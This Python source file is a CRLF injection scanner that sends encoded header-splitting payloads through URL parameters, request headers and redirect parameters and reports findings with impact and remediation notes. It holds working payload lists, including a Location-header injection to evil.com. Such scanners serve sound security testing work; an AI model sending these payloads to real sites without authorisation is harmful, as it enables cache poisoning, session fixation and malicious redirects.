"""
CRLF Injection Scanner - Detects CRLF injection vulnerabilities  
"""

import logging
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Any, Optional
from core.config.config_manager import ConfigManager
from core.reporting.report_generator import Finding, Severity
from core.utils.logger import get_security_logger

logger = logging.getLogger(__name__)
security_logger = get_security_logger()

class CRLFScanner:
    """CRLF injection vulnerability scanner."""

    def __init__(self, config_manager: ConfigManager):
        """
        Initialize the CRLF scanner.

        Args:
            config_manager: Configuration manager instance
        """
        self.config = config_manager.get_scanner_config('crlf')
        self.general_config = config_manager.get('general')

        # CRLF injection payloads
        self.payloads = [
            "%0d%0aSet-Cookie:%20crlf=injection",
            "%0d%0aLocation:%20http://evil.com",
            "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK",
            "%0a%0aSet-Cookie:%20crlf=injection",
            "%0aSet-Cookie:%20crlf=injection",
            "%0dSet-Cookie:%20crlf=injection",
            "\r\nSet-Cookie: crlf=injection",
            "\nSet-Cookie: crlf=injection",
            "\rSet-Cookie: crlf=injection",
            "%E5%98%8A%E5%98%8DSet-Cookie: crlf=injection",
            "%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
            "%u000aSet-Cookie: crlf=injection",
            "%u000dSet-Cookie: crlf=injection",
            "%u000d%u000aSet-Cookie: crlf=injection",
            "%%0a0aSet-Cookie: crlf=injection",
            "%%0d0aSet-Cookie: crlf=injection",
        ]

        # Header injection payloads
        self.header_payloads = [
            "%0d%0aX-Injected-Header:%20crlf",
            "%0aX-Injected-Header:%20crlf", 
            "%0dX-Injected-Header:%20crlf",
            "\r\nX-Injected-Header: crlf",
            "\nX-Injected-Header: crlf",
            "\rX-Injected-Header: crlf",
        ]

    def scan(self, target_url: str) -> List[Finding]:
        """
        Scan for CRLF injection vulnerabilities.

        Args:
            target_url: URL to scan

        Returns:
            List of findings
        """
        logger.info(f"Starting CRLF injection scan on {target_url}")
        findings = []

        try:
            # Test CRLF in URL parameters
            findings.extend(self._test_url_parameters(target_url))
            
            # Test CRLF in headers
            findings.extend(self._test_header_injection(target_url))
            
            # Test CRLF in redirects
            findings.extend(self._test_redirect_injection(target_url))

        except Exception as e:
            logger.error(f"Error during CRLF scan: {str(e)}")
            security_logger.log_error("CRLF_SCAN_ERROR", str(e), target_url)

        logger.info(f"CRLF scan completed - {len(findings)} findings")
        return findings

    def _test_url_parameters(self, target_url: str) -> List[Finding]:
        """Test for CRLF injection in URL parameters."""
        findings = []
        
        parsed_url = urlparse(target_url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            # Add a test parameter if none exist
            query_params = {'param': ['test']}
        
        for param_name in query_params:
            for payload in self.payloads:
                try:
                    # Replace parameter value with payload
                    test_params = query_params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    response = requests.get(
                        test_url,
                        params=test_params,
                        timeout=self.general_config.get('timeout', 30),
                        headers={'User-Agent': self.general_config.get('user_agent')},
                        allow_redirects=False
                    )
                    
                    if self._analyze_crlf_response(response, payload):
                        finding = Finding(
                            title="CRLF Injection in URL Parameter",
                            severity=Severity.MEDIUM,
                            confidence=0.8,
                            description=f"CRLF injection vulnerability detected in parameter '{param_name}'",
                            url=target_url,
                            method="GET",
                            parameter=param_name,
                            payload=payload,
                            evidence=self._extract_crlf_evidence(response, payload),
                            impact="Attackers can inject arbitrary HTTP headers, potentially leading to cache poisoning, session fixation, or XSS.",
                            remediation="Sanitize user input by removing or encoding CRLF characters (\\r and \\n) before using in HTTP responses."
                        )
                        findings.append(finding)
                        logger.warning(f"CRLF injection found in parameter {param_name} with payload: {payload}")
                        break  # Found one for this parameter, move to next
                        
                except requests.RequestException as e:
                    logger.debug(f"Error testing CRLF in parameter {param_name}: {str(e)}")

        return findings

    def _test_header_injection(self, target_url: str) -> List[Finding]:
        """Test for CRLF injection through HTTP headers."""
        findings = []
        
        # Test injection through various headers
        test_headers = ['X-Forwarded-For', 'User-Agent', 'Referer', 'X-Real-IP']
        
        for header_name in test_headers:
            for payload in self.header_payloads:
                try:
                    headers = {
                        'User-Agent': self.general_config.get('user_agent'),
                        header_name: f"normal_value{payload}"
                    }
                    
                    response = requests.get(
                        target_url,
                        headers=headers,
                        timeout=self.general_config.get('timeout', 30),
                        allow_redirects=False
                    )
                    
                    if self._analyze_header_injection(response, payload):
                        finding = Finding(
                            title="CRLF Injection via HTTP Header",
                            severity=Severity.MEDIUM,
                            confidence=0.7,
                            description=f"CRLF injection vulnerability detected via '{header_name}' header",
                            url=target_url,
                            method="GET",
                            evidence=self._extract_header_evidence(response, header_name, payload),
                            impact="Attackers can inject HTTP headers through user-controllable headers, potentially enabling cache poisoning or session attacks.",
                            remediation="Validate and sanitize all HTTP headers before reflecting them in responses."
                        )
                        findings.append(finding)
                        logger.warning(f"CRLF injection found via header {header_name}")
                        break  # Found one for this header, move to next
                        
                except requests.RequestException as e:
                    logger.debug(f"Error testing CRLF via header {header_name}: {str(e)}")

        return findings

    def _test_redirect_injection(self, target_url: str) -> List[Finding]:
        """Test for CRLF injection in redirect responses."""
        findings = []
        
        # Common redirect parameters
        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target']
        
        parsed_url = urlparse(target_url)
        
        for param_name in redirect_params:
            for payload in self.payloads[:5]:  # Use fewer payloads for redirect tests
                try:
                    redirect_payload = f"http://example.com{payload}"
                    test_params = {param_name: redirect_payload}
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    
                    response = requests.get(
                        test_url,
                        params=test_params,
                        timeout=self.general_config.get('timeout', 30),
                        headers={'User-Agent': self.general_config.get('user_agent')},
                        allow_redirects=False
                    )
                    
                    if self._analyze_redirect_injection(response, payload):
                        finding = Finding(
                            title="CRLF Injection in Redirect",
                            severity=Severity.HIGH,
                            confidence=0.9,
                            description=f"CRLF injection vulnerability detected in redirect parameter '{param_name}'",
                            url=target_url,
                            method="GET",
                            parameter=param_name,
                            payload=redirect_payload,
                            evidence=self._extract_redirect_evidence(response, payload),
                            impact="Attackers can inject arbitrary HTTP headers in redirect responses, potentially enabling HTTP response splitting attacks.",
                            remediation="Validate redirect URLs and sanitize CRLF characters before using in Location headers."
                        )
                        findings.append(finding)
                        logger.warning(f"CRLF injection in redirect found with parameter: {param_name}")
                        break
                        
                except requests.RequestException as e:
                    logger.debug(f"Error testing redirect CRLF with parameter {param_name}: {str(e)}")

        return findings

    def _analyze_crlf_response(self, response: requests.Response, payload: str) -> bool:
        """Analyze response for CRLF injection indicators."""
        # Check if injected headers appear in response
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        # Look for injected Set-Cookie header
        if 'set-cookie' in headers_lower:
            cookie_value = headers_lower['set-cookie']
            if 'crlf=injection' in cookie_value.lower():
                return True
        
        # Look for injected X-Injected-Header
        if 'x-injected-header' in headers_lower:
            return True
        
        # Check for CRLF in response body (reflected)
        if payload.replace('%0d%0a', '\r\n').replace('%0a', '\n').replace('%0d', '\r') in response.text:
            return True
            
        # Check for raw CRLF sequences in response
        crlf_patterns = ['\r\nSet-Cookie:', '\nSet-Cookie:', '\r\nX-Injected-Header:', '\nX-Injected-Header:']
        response_text = response.text
        
        for pattern in crlf_patterns:
            if pattern in response_text:
                return True
                
        return False

    def _analyze_header_injection(self, response: requests.Response, payload: str) -> bool:
        """Analyze response for header injection."""
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        # Look for injected headers
        if 'x-injected-header' in headers_lower:
            return True
            
        # Check if CRLF sequences appear in any header values
        for header_value in response.headers.values():
            if '\r\n' in header_value or '\n' in header_value:
                return True
                
        return False

    def _analyze_redirect_injection(self, response: requests.Response, payload: str) -> bool:
        """Analyze redirect response for CRLF injection."""
        if response.status_code not in [301, 302, 303, 307, 308]:
            return False
            
        location_header = response.headers.get('Location', '')
        
        # Check if injected content appears in Location header
        if 'Set-Cookie:' in location_header or 'X-Injected-Header:' in location_header:
            return True
            
        # Check for additional headers that might have been injected
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        if 'x-injected-header' in headers_lower or ('set-cookie' in headers_lower and 'crlf=injection' in headers_lower['set-cookie'].lower()):
            return True
            
        return False

    def _extract_crlf_evidence(self, response: requests.Response, payload: str) -> str:
        """Extract evidence of CRLF injection."""
        evidence = [f"Payload: {payload}"]
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        if 'set-cookie' in headers_lower and 'crlf=injection' in headers_lower['set-cookie'].lower():
            evidence.append(f"Injected Set-Cookie header: {headers_lower['set-cookie']}")
            
        if 'x-injected-header' in headers_lower:
            evidence.append(f"Injected X-Injected-Header: {headers_lower['x-injected-header']}")
            
        evidence.append(f"Status Code: {response.status_code}")
        
        return "; ".join(evidence)

    def _extract_header_evidence(self, response: requests.Response, header_name: str, payload: str) -> str:
        """Extract evidence of header injection."""
        evidence = [f"Injection via {header_name} header"]
        evidence.append(f"Payload: {payload}")
        
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        
        if 'x-injected-header' in headers_lower:
            evidence.append(f"Successfully injected: X-Injected-Header: {headers_lower['x-injected-header']}")
            
        return "; ".join(evidence)

    def _extract_redirect_evidence(self, response: requests.Response, payload: str) -> str:
        """Extract evidence of redirect injection."""
        evidence = [f"Redirect Status: {response.status_code}"]
        evidence.append(f"Payload: {payload}")
        
        location = response.headers.get('Location', '')
        if location:
            evidence.append(f"Location header: {location}")
            
        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        if 'x-injected-header' in headers_lower:
            evidence.append(f"Injected header detected: {headers_lower['x-injected-header']}")
            
        return "; ".join(evidence)